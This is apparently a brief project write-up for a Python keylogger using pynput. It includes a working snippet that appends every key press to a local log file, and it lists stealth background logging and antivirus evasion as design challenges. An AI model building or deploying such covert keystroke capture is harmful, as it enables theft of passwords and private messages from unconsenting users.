Keylogger Project

A simple Python-based keylogger that captures keystrokes using the pynput library. The project helps understand low-level keyboard input handling for educational and ethical testing purposes only.

Technologies Used

  • Python
  • Pynput library
  • Windows File I/O

Challenges Faced

  • Ensuring stealth mode while logging keys in the background.
  • Handling special characters and non-English layouts.
  • Preventing detection by antivirus software.

Sample Code Snippet


from pynput.keyboard import Key, Listener

def on_press(key):
    with open("log.txt", "a") as f:
        f.write(f"{key} pressed\n")

with Listener(on_press=on_press) as listener:
    listener.join()
